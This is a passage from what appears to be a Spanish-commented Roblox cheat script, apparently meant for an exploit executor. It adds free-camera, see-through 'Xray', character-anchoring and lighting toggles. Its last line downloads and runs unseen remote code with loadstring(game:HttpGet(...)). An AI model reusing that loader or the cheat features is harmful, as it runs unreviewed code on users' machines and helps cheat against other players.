	end,
})
----Camara libre---



local StarterGui = game:GetService("StarterGui")

local player = Players.LocalPlayer
local camera = workspace.CurrentCamera

local freecamEnabled = false
local moveDirection = Vector3.zero
local camRotation = Vector2.new()
local camPosition = Vector3.zero
local speed = 1.5
local keysHeld = {}
local toggleActive = false
local sensitivity = 0.005

local lastTouchPosition = nil
local guiFrames = nil -- los botones de movimiento

-- Congelar personaje
local function FreezeCharacter()
	local char = player.Character
	if char then
		local humanoid = char:FindFirstChildOfClass("Humanoid")
		if humanoid then
			humanoid.AutoRotate = false
			humanoid.WalkSpeed = 0
			humanoid.JumpPower = 0
		end
	end
end

-- Restaurar personaje
local function UnfreezeCharacter()
	local char = player.Character
	if char then
		local humanoid = char:FindFirstChildOfClass("Humanoid")
		if humanoid then
			humanoid.AutoRotate = true
			humanoid.WalkSpeed = 16
			humanoid.JumpPower = 50
		end
	end
end

-- Crear GUI táctil
local function CreateTouchGui()
	guiFrames = Instance.new("ScreenGui")
	guiFrames.Name = "MobileMovementGui"
	guiFrames.ResetOnSpawn = false
	guiFrames.Parent = player:WaitForChild("PlayerGui")

	local function CreateButton(name, position, keycode)
		local button = Instance.new("TextButton")
		button.Name = name
		button.Size = UDim2.new(0, 60, 0, 60)
		button.Position = position
		button.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
		button.Text = name
		button.TextColor3 = Color3.new(1, 1, 1)
		button.TextScaled = true
		button.Parent = guiFrames

		button.MouseButton1Down:Connect(function()
			keysHeld[keycode] = true
		end)
		button.MouseButton1Up:Connect(function()
			keysHeld[keycode] = false
		end)
	end

	-- Crear los botones
	CreateButton("W", UDim2.new(0, 100, 1, -200), Enum.KeyCode.W)
	CreateButton("A", UDim2.new(0, 40, 1, -140), Enum.KeyCode.A)
	CreateButton("S", UDim2.new(0, 100, 1, -140), Enum.KeyCode.S)
	CreateButton("D", UDim2.new(0, 160, 1, -140), Enum.KeyCode.D)
end

-- Destruir GUI táctil
local function RemoveTouchGui()
	if guiFrames then
		guiFrames:Destroy()
		guiFrames = nil
	end
end

-- Teclas presionadas
UserInputService.InputBegan:Connect(function(input, gpe)
	if not gpe and freecamEnabled then
		if input.KeyCode == Enum.KeyCode.W or input.KeyCode == Enum.KeyCode.A or input.KeyCode == Enum.KeyCode.S or input.KeyCode == Enum.KeyCode.D or input.KeyCode == Enum.KeyCode.E or input.KeyCode == Enum.KeyCode.Q then
			keysHeld[input.KeyCode] = true
		end
	end
end)

UserInputService.InputEnded:Connect(function(input)
	if freecamEnabled then
		if input.KeyCode == Enum.KeyCode.W or input.KeyCode == Enum.KeyCode.A or input.KeyCode == Enum.KeyCode.S or input.KeyCode == Enum.KeyCode.D or input.KeyCode == Enum.KeyCode.E or input.KeyCode == Enum.KeyCode.Q then
			keysHeld[input.KeyCode] = false
		end
	end
end)

-- Capturar movimiento de cámara con Touch
UserInputService.TouchMoved:Connect(function(input, gpe)
	if freecamEnabled and not gpe then
		if lastTouchPosition then
			local delta = input.Position - lastTouchPosition
			camRotation = camRotation + Vector2.new(-delta.Y, -delta.X) * sensitivity * 0.1
			camRotation = Vector2.new(math.clamp(camRotation.X, -math.pi/2, math.pi/2), camRotation.Y)
		end
		lastTouchPosition = input.Position
	end
end)

UserInputService.TouchEnded:Connect(function(input, gpe)
	if not gpe then
		lastTouchPosition = nil
	end
end)

-- Calcular hacia dónde moverse
local function CalculateMoveVector()
	local moveVec = Vector3.zero

	if keysHeld[Enum.KeyCode.W] then moveVec = moveVec + Vector3.new(0, 0, -1) end
	if keysHeld[Enum.KeyCode.S] then moveVec = moveVec + Vector3.new(0, 0, 1) end
	if keysHeld[Enum.KeyCode.A] then moveVec = moveVec + Vector3.new(-1, 0, 0) end
	if keysHeld[Enum.KeyCode.D] then moveVec = moveVec + Vector3.new(1, 0, 0) end
	if keysHeld[Enum.KeyCode.E] then moveVec = moveVec + Vector3.new(0, 1, 0) end
	if keysHeld[Enum.KeyCode.Q] then moveVec = moveVec + Vector3.new(0, -1, 0) end

	return moveVec
end

local function EnableFreecam()
	if not freecamEnabled then
		freecamEnabled = true
		camera.CameraType = Enum.CameraType.Scriptable
		camPosition = camera.CFrame.Position

		local _, yaw = camera.CFrame:ToOrientation()
		local pitch = math.asin(-camera.CFrame.LookVector.Y)
		camRotation = Vector2.new(pitch, yaw)

		UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
		UserInputService.MouseIconEnabled = false

		FreezeCharacter()

		if UserInputService.TouchEnabled then
			CreateTouchGui()
		end

		RunService:BindToRenderStep("Freecam", Enum.RenderPriority.Camera.Value, function(dt)
			if not UserInputService.TouchEnabled then
				local delta = UserInputService:GetMouseDelta()
				camRotation = camRotation + Vector2.new(-delta.Y, -delta.X) * sensitivity
				camRotation = Vector2.new(math.clamp(camRotation.X, -math.pi/2, math.pi/2), camRotation.Y)
			end

			local yawCF = CFrame.Angles(0, camRotation.Y, 0)
			local pitchCF = CFrame.Angles(camRotation.X, 0, 0)
			local moveVec = CalculateMoveVector()

			if moveVec.Magnitude > 0 then
				moveVec = (yawCF * pitchCF):VectorToWorldSpace(moveVec.Unit) * speed
				camPosition = camPosition + moveVec
			end

			camera.CFrame = yawCF * pitchCF + camPosition
		end)
	end
end

local function DisableFreecam()
	if freecamEnabled then
		freecamEnabled = false
		RunService:UnbindFromRenderStep("Freecam")
		camera.CameraType = Enum.CameraType.Custom

		UserInputService.MouseBehavior = Enum.MouseBehavior.Default
		UserInputService.MouseIconEnabled = true

		UnfreezeCharacter()
		RemoveTouchGui()
	end
end

-- Toggle de cámara
MainTab:CreateToggle({
	Name = "Camara libre",
	CurrentValue = false,
	Flag = "CamaraL",
	Callback = function(Value)
		toggleActive = Value
		if Value then
			EnableFreecam()
		else
			DisableFreecam()
		end
	end,
})

-- Keybind de activación
MainTab:CreateKeybind({
	Name = "Bind Camara Libre",
	CurrentKeybind = "P",
	HoldToInteract = false,
	Flag = "CamaraLKeybind",
	Callback = function()
		if toggleActive then
			if freecamEnabled then
				DisableFreecam()
			else
				EnableFreecam()
			end
		end
	end,
})

-- Slider de sensibilidad
MainTab:CreateSlider({
	Name = "Sensibilidad de cámara",
	Range = {0.001, 0.049},
	Increment = 0.001,
	Suffix = "Sensibilidad",
	CurrentValue = sensitivity,
	Flag = "CameraSensitivity",
	Callback = function(Value)
		sensitivity = Value
	end,
})


























--XRAY----

-- Tabla para guardar las transparencias originales
local originalTransparency = {}

-- Función que activa o desactiva el Xray
function ToggleXray(state)
    for _, object in pairs(workspace:GetDescendants()) do
        if object:IsA("BasePart") then
            if not object:IsA("Model") or not object:FindFirstChild("Humanoid") then
                if not object:IsA("Part") or object.Name ~= "SpawnLocation" then
                    if not (object.Parent and object.Parent:FindFirstChild("HumanoidRootPart")) then
                        if state then
                            -- Guardar la transparencia original si no está guardada ya
                            if originalTransparency[object] == nil then
                                originalTransparency[object] = object.Transparency
                            end
                            object.Transparency = 0.8
                        else
                            -- Restaurar la transparencia original si se había guardado
                            if originalTransparency[object] ~= nil then
                                object.Transparency = originalTransparency[object]
                                originalTransparency[object] = nil
                            end
                        end
                    end
                end
            end
        end
    end
end

-- Crear el toggle de Xray
XrayToggle = MainTab:CreateToggle({
    Name = "Xray", 
    CurrentValue = false,
    Callback = function(state)
        ToggleXray(state)
    end
})



----Anclar----

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local RunService = game:GetService("RunService")



getgenv().AnchoredStatus = false
local anchorConnection

-- Función para anclar o desanclar todas las partes del personaje
local function setAnchored(state)
    local character = LocalPlayer.Character
    if character then
        for _, part in ipairs(character:GetDescendants()) do
            if part:IsA("BasePart") then
                part.Anchored = state
            end
        end
    end
end

-- Toggle de Rayfield para activar o desactivar el anclaje
MainTab:CreateToggle({
    Name = "Anclar Personaje",
    CurrentValue = false,
    Flag = "AnchorToggle",
    Callback = function(state)
        getgenv().AnchoredStatus = state
        if state then
            setAnchored(true)
            -- Opcional: mantener anclado por si muere o respawnea
            anchorConnection = RunService.Heartbeat:Connect(function()
                if getgenv().AnchoredStatus then
                    setAnchored(true)
                end
            end)
        else
            setAnchored(false)
            if anchorConnection then
                anchorConnection:Disconnect()
                anchorConnection = nil
            end
        end
    end,
})



--Shader--


-- Referencia a Lighting

-- Variables para guardar el estado original
local originalSettings = {
    Brightness = nil,
    ExposureCompensation = nil,
    ClockTime = nil,
    Sky = nil,
    Effects = {},
}

-- Función para guardar el estado actual de Lighting
local function SaveLightingState()
    -- Guardar solo si no ha sido guardado previamente
    originalSettings.Brightness = Lighting.Brightness
    originalSettings.ExposureCompensation = Lighting.ExposureCompensation
    originalSettings.ClockTime = Lighting.ClockTime

    -- Guardar efectos y cielo actuales
    originalSettings.Effects = {}
    for _, v in ipairs(Lighting:GetChildren()) do
        if v:IsA("PostEffect") then
            table.insert(originalSettings.Effects, v:Clone()) -- Guardar clones para restaurar
        elseif v:IsA("Sky") then
            originalSettings.Sky = v:Clone() -- Guardar el objeto cielo
        end
    end
end

-- Función para restaurar el estado original
local function RestoreLightingState()
    -- Eliminar efectos actuales
    for _, v in ipairs(Lighting:GetChildren()) do
        if v:IsA("PostEffect") or v:IsA("Sky") then
            v:Destroy()
        end
    end

    -- Restaurar valores originales
    Lighting.Brightness = originalSettings.Brightness
    Lighting.ExposureCompensation = originalSettings.ExposureCompensation
    Lighting.ClockTime = originalSettings.ClockTime

    -- Restaurar cielo
    if originalSettings.Sky then
        originalSettings.Sky.Parent = Lighting
    end

    -- Restaurar efectos
    for _, effect in ipairs(originalSettings.Effects) do
        if effect.Parent == nil then
            effect.Parent = Lighting
        end
    end
end

-- Función para aplicar los shaders
local function ApplyShaders()
    -- Crear y aplicar los efectos de shaders
    local Sky = Instance.new("Sky")
    local Bloom = Instance.new("BloomEffect")
    local Blur = Instance.new("BlurEffect")
    local ColorC = Instance.new("ColorCorrectionEffect")
    local SunRays = Instance.new("SunRaysEffect")

    -- Ajustes visuales
    Lighting.Brightness = 2.25
    Lighting.ExposureCompensation = 0.1
    Lighting.ClockTime = 17.55

    -- Configuración del cielo y efectos
    Sky.SkyboxBk = "http://www.roblox.com/asset/?id=144933338"
    Sky.SkyboxDn = "http://www.roblox.com/asset/?id=144931530"
    Sky.SkyboxFt = "http://www.roblox.com/asset/?id=144933262"
    Sky.SkyboxLf = "http://www.roblox.com/asset/?id=144933244"
    Sky.SkyboxRt = "http://www.roblox.com/asset/?id=144933299"
    Sky.SkyboxUp = "http://www.roblox.com/asset/?id=144931564"
    Sky.StarCount = 5000
    Sky.SunAngularSize = 5
    Sky.Parent = Lighting

    Bloom.Intensity = 0.3
    Bloom.Size = 10
    Bloom.Threshold = 0.8
    Bloom.Parent = Lighting

    Blur.Size = 5
    Blur.Parent = Lighting

    ColorC.Brightness = 0
    ColorC.Contrast = 0.1
    ColorC.Saturation = 0.25
    ColorC.TintColor = Color3.fromRGB(255, 255, 255)
    ColorC.Parent = Lighting

    SunRays.Intensity = 0.1
    SunRays.Spread = 0.8
    SunRays.Parent = Lighting
end

-- Estado del shader
local shadersEnabled = false

-- Toggle para activar/desactivar shaders
toggleShader = MainTab:CreateToggle({
    Name = "Shader",
    Callback = function()
        shadersEnabled = not shadersEnabled
        if shadersEnabled then
            SaveLightingState()  -- Guardamos el estado antes de aplicar los shaders
            ApplyShaders()       -- Activamos los shaders
        else
            RestoreLightingState()  -- Restauramos el estado anterior
        end
    end
})

local Lighting = game:GetService("Lighting")

-- Guardar configuración original
local originalClockTime = Lighting.ClockTime
local userSelectedTime = originalClockTime
local isCustomTimeEnabled = false

-- Toggle para activar/desactivar la hora personalizada
MainTab:CreateToggle({
   Name = "Activar hora personalizada",
   CurrentValue = false,
   Callback = function(state)
       isCustomTimeEnabled = state
       if state then
           Lighting.ClockTime = userSelectedTime
       else
           Lighting.ClockTime = originalClockTime
       end
   end,
})

-- Slider para cambiar el tiempo del juego
MainTab:CreateSlider({
   Name = "Hora del juego",
   Range = {0, 24},
   Increment = 0.1,
   Suffix = "h",
   CurrentValue = originalClockTime,
   Callback = function(value)
       userSelectedTime = value
       if isCustomTimeEnabled then
           Lighting.ClockTime = value
       end
   end,
})



--- jugadores
loadstring(game:HttpGet("https://raw.githubusercontent.com/JoaoMods26/mods/refs/heads/main/Jugadores"))()




























